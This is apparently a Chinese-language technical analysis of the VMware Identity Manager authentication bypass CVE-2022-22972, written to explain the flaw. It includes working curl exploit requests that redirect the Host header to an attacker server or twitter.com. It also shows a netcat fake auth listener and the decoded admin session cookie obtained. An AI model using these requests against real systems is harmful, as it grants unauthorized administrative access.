2022 年 5 月 18 日，VMware在 CVE-2022-22972 和 CVE-2022-22973 上发布了 VMSA- 2022-0014。这两个漏洞中较为严重的是 CVE-2022-22972，这是一种影响 VMware 的 Workspace ONE Access、Identity Manager 和 vRealize Automation 7.6 的嵌入式 Identity Manager 服务器的关键身份验证绕过。该漏洞允许对管理界面具有网络访问权限的攻击者使用任何帐户对 Web 控制台进行身份验证。

06
漏洞分析


为了分析这个问题，我们使用了 Horizon3 的概念验证，但我们对其进行了修改以针对我们的目标主机工作：VMware Identity Manager (vIDM) 3.3.3.0。我们的分析将使用针对 vIDM 3.3.3.0 的 cURL 请求来展示问题和影响。


根据该漏洞，VMware 的身份验证端点似乎使用HostHTTP 标头联系上游身份验证服务器。由于客户端控制Host标头，我们可以将其指向另一台服务器，VMware 将改为对该服务器进行身份验证。为了验证用户的凭据，VMware 将包含用户名、密码和其他详细信息的 POST 请求发送到 中/SAAS/API/1.0/REST/auth/local/login列出的服务器端点Host，然后等待HTTP 200/OK响应。



为了演示，我们访问了目标服务器的授权端点 ( https://target.server/SAAS/auth/login) 并提交了所需的用户名和任何密码。我们使用 Firefox 的选项卡捕获了传出的身份验证请求Network（Burp Suite 也可以使用）。


这是典型的身份验证请求cURL，删除了无关字段：

$ curl -iks 'https://target.server/SAAS/auth/login/embeddedauthbroker/callback' -H 'Host: target.server' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'protected_state=eyJ[...]9&userstore=System+Domain&username=admin&password=password&userstoreDisplay=System+Domain&horizonRelayState=f38e339d-36bb-4ae2-b740-e78b99d2e8c9&stickyConnectorId=&action=Sign+in'
[...]Your username or password is incorrect.[...]

在我们的实验室中，我们有一个反向 Nginx 代理，它使用有效证书终止 SSL，并将请求代理到实验室主机进行分析。我们在该主机上创建了一个 Netcat 侦听器，以创建世界上最简单的 HTTP 服务器，它将侦听 HTTP 版本的请求并响应HTTP/1.1 200 OK任何内容：

# echo -ne 'HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n' | nc -vv -l -p 80

然后将HostVMware 身份验证请求的标头更改为指向 SSL 代理：

$ curl -iks 'https://target.server/SAAS/auth/login/embeddedauthbroker/callback' -H 'Host: attack.server' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'protected_state=eyJ[...]9&userstore=System+Domain&username=admin&password=password&userstoreDisplay=System+Domain&horizonRelayState=f38e339d-36bb-4ae2-b740-e78b99d2e8c9&stickyConnectorId=&action=Sign+in'[...]Set-Cookie: HZN=eyJ[...]w; Path=/; Secure; HttpOnly[...]

在我们的假身份验证服务器上，我们看到请求进入：

$ echo -ne 'HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n' | nc -v -l -p 8079listening on [any] 8079 ...connect to [10.0.0.123] from 10.0.0.1 34522POST /SAAS/API/1.0/REST/auth/local/login HTTP/1.1User-Agent: curl/7.79.1Content-Type: application/jsonContent-Length: 128[...]
{"organizationName":"IDENTITY-MANAGER-3-3","username":"admin","password":"password","issuetoken":false,"domain":"System Domain"}

VMware 目标发出HZNcookie，该 cookie 解码为以下内容：

{  "jti": "a274d75f-4fdd-446c-afdb-98b5d54c6818",  "prn": "admin@IDENTITY-MANAGER-3-3",  "domain": "System Domain",  "user_id": "5",  "auth_time": 1653592546,  "iss": "https://attack.server/SAAS/auth",  "aud": "https://attack.server/SAAS/auth/oauthtoken",  "ctx": "[{\"mtd\":\"urn:vmware:names:ac:classes:LocalPasswordAuth\",\"iat\":1653592546,\"id\":3}]",  "scp": "profile admin user email operator",  [...]}

我们可以看到它是一个有效的身份验证cookie admin！


只是为了好玩，我们检查了前 200 个 Web 服务器，发现 Twitter（以及其他几个）在所需的端点上以 HTTP/200 响应。这意味着我们可以通过将Host标头更改为twitter.com而不是运行我们自己的 TLS 服务器来利用它：

$ curl -iks 'https://target.server/SAAS/auth/login/embeddedauthbroker/callback' -H 'Host: twitter.com' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'protected_state=ey[...]9&userstore=System+Domain&username=admin&password=password&userstoreDisplay=System+Domain&horizonRelayState=f38e339d-36bb-4ae2-b740-e78b99d2e8c9&stickyConnectorId=&action=Sign+in'HTTP/1.1 302 Set-Cookie: HZN=ey[...]A; Path=/; Secure; HttpOnly[...]
